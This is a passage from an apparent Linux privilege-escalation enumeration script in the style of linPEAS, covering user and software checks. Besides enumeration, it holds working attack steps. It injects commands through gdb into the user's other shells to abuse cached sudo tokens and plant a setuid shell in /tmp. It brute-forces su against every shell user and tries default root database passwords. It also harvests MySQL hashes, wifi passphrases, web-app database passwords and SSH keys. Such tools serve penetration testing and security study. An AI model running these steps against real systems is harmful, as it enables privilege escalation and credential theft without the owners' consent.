      echo "Sudoers file: $filename is readable" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
      cat "$filename" | grep -v "^$" | grep -v "#" | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoG,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed "s,pwfeedback,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sudoVB,${C}[1;31;103m&${C}[0m,"
    fi
  done
  echo ""

  #-- UI) Sudo tokens
  printf $Y"[+] "$GREEN"Checking sudo tokens\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\n"$NC
  ptrace_scope="`cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null`"
  if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "/proc/sys/kernel/yama/ptrace_scope is enabled (0)" | sed "s,0,${C}[1;31m&${C}[0m,g";
  else echo "/proc/sys/kernel/yama/ptrace_scope is not enabled ($ptrace_scope)" | sed "s,is not enabled,${C}[1;32m&${C}[0m,g";
  fi
  is_gdb="`command -v gdb 2>/dev/null`"
  if [ "$is_gdb" ]; then echo "gdb was found in PATH" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g";
  else echo "gdb wasn't found in PATH" | sed "s,gdb,${C}[1;32m&${C}[0m,g";
  fi
  if [ ! "$SUPERFAST" ] && [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ] && [ "$is_gdb" ]; then
    echo "Checking for sudo tokens in other shells owned by current user"
    for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" 2>/dev/null | grep -v "^$$\$"); do
      echo "Injecting process $pid -> "$(cat "/proc/$pid/comm" 2>/dev/null)
      echo 'call system("echo | sudo -S cp /bin/sh /tmp/shrndom >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/shrndom >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1
    done
    if [ -f "/tmp/shrndom" ]; then 
      echo "Sudo tokens exploit worked, you can escalate privileges using '/tmp/shrndom -p'" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,";
    else echo "The escalation didn't work... (try again later?)"
    fi
  fi
  echo ""

  #-- UI) Doas
  printf $Y"[+] "$GREEN"Checking doas.conf\n"$NC
  if [ "`cat /etc/doas.conf "$(dirname $(command -v doas) 2>/dev/null)/doas.conf" "$(dirname $(command -v doas) 2>/dev/null)/../etc/doas.conf" "$(dirname $(command -v doas) 2>/dev/null)/etc/doas.conf" 2>/dev/null`" ]; then cat /etc/doas.conf "$(dirname $(command -v doas))/doas.conf" "$(dirname $(command -v doas))/../etc/doas.conf" "$(dirname $(command -v doas))/etc/doas.conf" 2>/dev/null | sed -${E} "s,$sh_usrs,${C}[1;31m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,nopass,${C}[1;31m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m,"
  else echo_not_found "/etc/doas.conf"
  fi
  echo ""

  #-- UI) Pkexec policy
  printf $Y"[+] "$GREEN"Checking Pkexec policy\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2\n"$NC
  (cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m," | sed -${E} "s,$groupsVB,${C}[1;31m&${C}[0m," | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$Groups,${C}[1;31;103m&${C}[0m,") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
  echo ""

  #-- UI) Superusers
  printf $Y"[+] "$GREEN"Superusers\n"$NC
  awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- UI) Users with console
  printf $Y"[+] "$GREEN"Users with console\n"$NC
  if [ "$MACPEAS" ]; then
    dscl . list /Users | while read uname; do
      ushell=`dscl . -read "/Users/$uname" UserShell | cut -d " " -f2`
      if [ "`grep \"$ushell\" /etc/shells`" ]; then #Shell user
        dscl . -read "/Users/$uname" UserShell RealName RecordName Password NFSHomeDirectory 2>/dev/null | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
        echo ""
      fi
    done
  else
    no_shells="`cat /etc/passwd 2>/dev/null | grep -Ev "sh$" | cut -d ":" -f 7 | sort | uniq`"
    unexpected_shells=""
    printf "$no_shells\n" | while read f; do
      if [ "`$f -c 'whoami' 2>/dev/null | grep \"$(whoami)\"`" ]; then 
        unexpected_shells="$f\n$unexpected_shells"
      fi
    done
    cat /etc/passwd 2>/dev/null | grep "sh$" | sort | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
    if [ "$unexpected_shells" ]; then
      echo "These unexpected binaries are acting like shells:\n$unexpected_shells" | sed -${E} "s,/.*,${C}[1;31m&${C}[0m,g"
      echo "Unexpected users with shells:"
      printf "$unexpected_shells\n" | while read f; do
        if [ "$f" ]; then
          grep -E "${f}$" /etc/passwd | sed -${E} "s,/.*,${C}[1;31m&${C}[0m,g"
        fi
      done
    fi
  fi
  echo ""

  #-- UI) All users & groups
  printf $Y"[+] "$GREEN"All users & groups\n"$NC
  if [ "$MACPEAS" ]; then
    dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$groupsVB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$knw_grps,${C}[1;32m&${C}[0m,g"
  else
    cut -d":" -f1 /etc/passwd 2>/dev/null| while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$groupsVB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$knw_grps,${C}[1;32m&${C}[0m,g"
  fi
  echo ""

  #-- UI) Login now
  printf $Y"[+] "$GREEN"Login now\n"$NC
  (w || who || users) 2>/dev/null | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- UI) Last logons
  printf $Y"[+] "$GREEN"Last logons\n"$NC
  (last -Faiw || last) 2>/dev/null | tail | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;31m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- UI) Login info
  printf $Y"[+] "$GREEN"Last time logon each user\n"$NC
  lastlog 2>/dev/null | grep -v "Never" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- UI) Password policy
  printf $Y"[+] "$GREEN"Password policy\n"$NC
  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  echo ""

  #-- UI) Brute su
  EXISTS_SUDO="`command -v sudo 2>/dev/null`"
  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ] && [ "$EXISTS_SUDO" ]; then
    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
    POSSIBE_SU_BRUTE=`check_if_su_brute`;
    if [ "$POSSIBE_SU_BRUTE" ]; then
      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
      printf "$SHELLUSERS\n" | while read u; do
        echo "  Bruteforcing user $u..."
        su_brute_user_num $u $PASSTRY
      done
    else
      printf $GREEN"It's not possible to brute-force su.\n\n"$NC
    fi
  else
    printf $Y"[+] "$GREEN"Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
  fi
  printf $Y"[+] "$GREEN"Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep SofI`" ]; then
  ###########################################
  #--------) Software Information (---------#
  ###########################################
  printf $B"═══════════════════════════════════╣ "$GREEN"Software Information"$B" ╠═══════════════════════════════════\n"$NC

  #-- SI) Mysql version
  printf $Y"[+] "$GREEN"MySQL version\n"$NC
  mysql --version 2>/dev/null || echo_not_found "mysql"
  echo ""

  #-- SI) Mysql connection root/root
  printf $Y"[+] "$GREEN"MySQL connection using default root/root ........... "$NC
  mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root --password=root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- SI) Mysql connection root/toor
  printf $Y"[+] "$GREEN"MySQL connection using root/toor ................... "$NC
  mysqlconnect=`mysqladmin -uroot -ptoor version 2>/dev/null`
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root --password=toor -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- SI) Mysql connection root/NOPASS
  mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
  printf $Y"[+] "$GREEN"MySQL connection using root/NOPASS ................. "$NC
  if [ "$mysqlconnectnopass" ]; then
    echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- SI) Mysql credentials
  printf $Y"[+] "$GREEN"Searching mysql credentials and exec\n"$NC
  mysqldirs=$(echo "$FIND_DIR_ETC\n$FIND_DIR_USR\n$FIND_DIR_VAR\n$FIND_DIR_MNT" | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -v "mysql/mysql")
  if [ "$mysqldirs" ]; then
    printf "$mysqldirs\n" | while read d; do 
      for f in `find $d -name debian.cnf 2>/dev/null`; do
        if [ -r $f ]; then 
          echo "We can read the mysql debian.cnf. You can use this username/password to log in MySQL" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
          cat "$f"
        fi
      done
      for f in `find $d -name user.MYD 2>/dev/null`; do
        if [ -r "$f" ]; then 
          echo "We can read the Mysql Hashes from $f" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
          grep -oaE "[-_\.\*a-Z0-9]{3,}" $f | grep -v "mysql_native_password" 
        fi
      done
      for f in `grep -lr "user\s*=" $d 2>/dev/null | grep -v "debian.cnf"`; do
        if [ -r "$f" ]; then
          u=`cat "$f" | grep -v "#" | grep "user" | grep "=" 2>/dev/null`
          echo "From '$f' Mysql user: $u" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
        fi
      done
      for f in `find $d -name my.cnf 2>/dev/null`; do
        if [ -r "$f" ]; then 
          echo "Found readable $f"
          cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed "s,password.*,${C}[1;31m&${C}[0m,"
        fi
      done
      mysqlexec=`whereis lib_mysqludf_sys.so 2>/dev/null | grep "lib_mysqludf_sys\.so"`
      if [ "$mysqlexec" ]; then 
        echo "Found $mysqlexec"
        echo "If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
      fi
    done
  else echo_not_found
  fi
  echo ""

  #-- SI) PostgreSQL info
  printf $Y"[+] "$GREEN"PostgreSQL version and pgadmin credentials\n"$NC
  postgver=`psql -V 2>/dev/null`
  postgdb=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'pgadmin.*\.db$')
  postgconfs=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$')
  if [ "$postgver" ] || [ "$postgdb" ] || [ "$postgconfs" ]; then
    if [ "$postgver" ]; then echo "Version: $postgver"; fi
    if [ "$postgdb" ]; then echo "PostgreSQL database: $postgdb" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; fi
    printf "$postgconfs\n" | while read f; do
      if [ -r "$f" ]; then 
        echo "Found readable $f"
        cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${C}[1;31m&${C}[0m," 2>/dev/null
        echo ""
      fi
    done
  else echo_not_found
  fi
  echo ""

  #-- SI) PostgreSQL brute
  if [ "$TIMEOUT" ]; then  # In some OS (like OpenBSD) it will expect the password from console and will pause the script. Also, this OS doesn't have the "timeout" command so lets only use this checks in OS that has it.
  #checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
    printf $Y"[+] "$GREEN"PostgreSQL connection to template0 using postgres/NOPASS ........ "$NC
    if [ "`timeout 1 psql -U postgres -d template0 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template1 using postgres/NOPASS ........ "$NC
    if [ "`timeout 1 psql -U postgres -d template1 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed "s,.)*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template0 using pgsql/NOPASS ........... "$NC
    if [ "`timeout 1 psql -U pgsql -d template0 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template1 using pgsql/NOPASS ........... "$NC
    if [ "`timeout 1 psql -U pgsql -d template1 -c 'select version()' 2> /dev/null`" ]; then echo "Yes" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi
    echo ""
  fi

  #-- SI) Apache info
  printf $Y"[+] "$GREEN"Apache server info\n"$NC
  apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
  if [ "$apachever" ]; then
    echo "Version: $apachever"
    sitesenabled=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep "sites-enabled")
    printf "$sitesenabled\n" | while read d; do for f in "$d/*"; do grep "AuthType\|AuthName\|AuthUserFile\|ServerName\|ServerAlias" $f 2>/dev/null | grep -v "#" | sed "s,Auth|ServerName|ServerAlias,${C}[1;31m&${C}[0m,"; done; done
    if [ !"$sitesenabled" ]; then
      default00=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep "000-default")
      printf "$default00\n" | while read f; do grep -E "AuthType|AuthName|AuthUserFile|ServerName|ServerAlias" "$f" 2>/dev/null | grep -v "#" | sed -${E} "s,Auth|ServerName|ServerAlias,${C}[1;31m&${C}[0m,"; done
    fi
    echo "PHP exec extensions"
    grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null
  else echo_not_found
  fi
  echo ""

  #-- SI) PHP cookies files
  phpsess1=`ls /var/lib/php/sessions 2>/dev/null`
  phpsess2=$(echo "$FIND_TMP\n$FIND_VAR\n$FIND_MNT" | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*')
  printf $Y"[+] "$GREEN"Searching PHPCookies\n"$NC
  if [ "$phpsess1" ] || [ "$phpsess2" ]; then
    if [ "$phpsess1" ]; then ls /var/lib/php/sessions 2>/dev/null; fi
    if [ "$phpsess2" ]; then $(echo "$FIND_TMP $FIND_VAR" | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*'); fi
  else echo_not_found
  fi
  echo ""

  #-- SI) Wordpress user, password, databname and host
  printf $Y"[+] "$GREEN"Searching Wordpress wp-config.php files\n"$NC
  wp=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'wp-config\.php$')
  if [ "$wp" ]; then
    printf "$wp\n" | while read f; do echo "$f"; grep -E "PASSWORD|USER|NAME|HOST" "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; echo ""; done
  else echo_not_found "wp-config.php"
  fi
  echo ""

  #-- SI) Drupal user, password, databname and host
  printf $Y"[+] "$GREEN"Searching Drupal settings.php files\n"$NC
  drup=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'settings\.php$')
  if [ "$drup" ]; then
    printf "$drup\n" | while read f; do 
      if [ "`echo $f | grep '/default/settings.php'`" ]; then #Check path /default/settings.php
        printf "Drupal settings.php file found: $f\n"
        grep -E "drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix'" $f 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,";
        echo ""
      fi
    done
  else echo_not_found "/default/settings.php"
  fi
  echo ""

  #-- SI) Moodle user, password, databname and host
  printf $Y"[+] "$GREEN"Searching Moodle config.php files\n"$NC
  moo=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'config\.php$')
  if [ "$moo" ]; then
      printf "$moo\n" | while read f; do 
        if [ "`echo $f | grep -i moodle/config.php`" ]; then
          printf "Moodle config.php file found: $f\n"
          grep -E "dbtype|dbhost|dbuser|dbhost|dbpass|dbport" $f 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; 
        fi
      done
  else echo_not_found "config.php inside a moodle folder"
  fi
  echo ""

  #-- SI) Tomcat users
  printf $Y"[+] "$GREEN"Searching Tomcat users file\n"$NC
  tomcat=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'tomcat-users\.xml$')
  if [ "$tomcat" ]; then
    echo "tomcat-users.xml file found: $tomcat"
    printf "$tomcat\n" | while read f; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "tomcat-users.xml"
  fi
  echo ""

  #-- SI) Mongo Information
  printf $Y"[+] "$GREEN"Mongo information\n"$NC
  mongos=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'mongod.*\.conf$')
  (mongo --version 2>/dev/null || mongod --version 2>/dev/null) || echo_not_found "mongo binary"
  printf "$mongos\n" | while read f; do
    if [ "$f" ]; then
      echo "Found $f"
      cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,auth*=*true|pass.*,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done

  #TODO: Check if you can login without password and warn the user
  echo ""

  #-- SI) Supervisord conf file
  printf $Y"[+] "$GREEN"Searching supervisord configuration file\n"$NC
  supervisorf=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'supervisord\.conf')
  if [ "$supervisorf" ]; then
    printf "$supervisorf\n" | while read f; do 
      echo "Found $f"; 
      cat "$f" 2>/dev/null | grep -E "port.*=|username.*=|password.*=" | sed -${E} "s,port|username|password,${C}[1;31m&${C}[0m,"; 
    done
  else echo_not_found "supervisord.conf"
  fi
  echo ""

  #-- SI) Cesi conf file
  cesi=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'cesi\.conf')
  printf $Y"[+] "$GREEN"Searching cesi configuration file\n"$NC
  if [ "$cesi" ]; then
    printf "$cesi\n"
    printf "$cesi\n" | while read f; do cat "$f" 2>/dev/null | grep "username.*=\|password.*=\|host.*=\|port.*=\|database.*=" | sed -${E} "s,username|password|database,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "cesi.conf"
  fi
  echo ""

  #-- SI) Rsyncd conf file
  rsyncd=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'rsyncd\.conf|rsyncd\.secrets')
  printf $Y"[+] "$GREEN"Searching Rsyncd config file\n"$NC
  if [ "$rsyncd" ]; then
    printf "$rsyncd\n" | while read f; do 
      printf "$f\n"
      if [ `echo "$f" | grep -i "secrets"` ]; then
        cat "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
      else
        cat "$f" 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,secrets.*|auth.*users.*=,${C}[1;31m&${C}[0m,"
      fi
      echo ""
    done
  else echo_not_found "rsyncd.conf"
  fi

  #-- SI) Hostapd conf file
  printf $Y"[+] "$GREEN"Searching Hostapd config file\n"$NC
  hostapd=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'hostapd\.conf')
  if [ "$hostapd" ]; then
    printf $Y"[+] "$GREEN"Hostapd conf was found\n"$NC
    printf "$hostapd\n"
    printf "$hostapd\n" | while read f; do cat "$f" 2>/dev/null | grep "passphrase" | sed "s,passphrase.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "hostapd.conf"
  fi
  echo ""

  #-- SI) Wifi conns
  printf $Y"[+] "$GREEN"Searching wifi conns file\n"$NC
  wifi=`find /etc/NetworkManager/system-connections/ -type f 2>/dev/null`
  if [ "$wifi" ]; then
    printf "$wifi\n" | while read f; do echo "$f"; cat "$f" 2>/dev/null | grep "psk.*=" | sed "s,psk.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found
  fi
  echo ""

  #-- SI) Anaconda-ks conf files
  printf $Y"[+] "$GREEN"Searching Anaconda-ks config files\n"$NC
  anaconda=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'anaconda-ks\.cfg')
  if [ "$anaconda" ]; then
    printf "$anaconda\n"
    printf "$anaconda\n" | while read f; do cat "$f" 2>/dev/null | grep "rootpw" | sed "s,rootpw.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "anaconda-ks.cfg"
  fi
  echo ""

  #-- SI) VNC files
  printf $Y"[+] "$GREEN"Searching .vnc directories and their passwd files\n"$NC
  vnc=$(echo "$FIND_DIR_HOME\n$FIND_DIR_USERS\n$FIND_DIR_MNT" | grep -E '\.vnc')
  if [ "$vnc" ]; then
    printf "$vnc\n"
    printf "$vnc\n" | while read d; do find "$d" -name "passwd" -exec ls -l {} \; 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found ".vnc"
  fi
  echo ""

  #-- SI) LDAP directories
  printf $Y"[+] "$GREEN"Searching ldap directories and their hashes\n"$NC
  ldap=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E 'ldap$')
  if [ "$ldap" ]; then
    printf "$ldap\n"
    echo "The password hash is from the {SSHA} to 'structural'";
    printf "$ldap" | while read d; do cat "$d/*.bdb" 2>/dev/null | grep -i -a -E -o "description.*" | sort | uniq | sed -${E} "s,administrator|password|ADMINISTRATOR|PASSWORD|Password|Administrator,${C}[1;31m&${C}[0m,g"; done
  else echo_not_found "ldap"
  fi
  echo ""

  #-- SI) .ovpn files
  printf $Y"[+] "$GREEN"Searching .ovpn files and credentials\n"$NC
  ovpn=$(echo "$FIND_ETC\n$FIND_USR\n$FIND_HOME\n$FIND_TMP\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E '\.ovpn')
  if [ "$ovpn" ]; then
    printf "$ovpn\n"
    printf "$ovpn\n" | while read f; do 
      if [ -r "$f" ]; then
        echo "Checking $f:"
        cat "$f" 2>/dev/null | grep "auth-user-pass" | sed -${E} "s,auth-user-pass.*,${C}[1;31m&${C}[0m,";
      fi
    done
  else echo_not_found ".ovpn"
  fi
  echo ""

  #-- SI) ssh files
  printf $Y"[+] "$GREEN"Searching ssl/ssh files\n"$NC
  ssh=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_MNT $FIND_USR $FIND_OPT $FIND_PRIVATE $FIND_APPLICATIONS" | grep -E 'id_dsa.*|id_rsa.*|known_hosts|authorized_hosts|authorized_keys')
  certsb4=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_MNT $FIND_USR $FIND_OPT $FIND_PRIVATE $FIND_APPLICATIONS" | grep -E '.*\.pem|.*\.cer|.*\.crt' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib.*')
  if [ "$certsb4" ]; then certsb4_grep=`grep -L "\"\|'\|(" $certsb4 2>/dev/null`; fi
  certsbin=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_MNT $FIND_USR $FIND_OPT $FIND_PRIVATE $FIND_APPLICATIONS" | grep -E '.*\.csr|.*\.der' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib/.*')
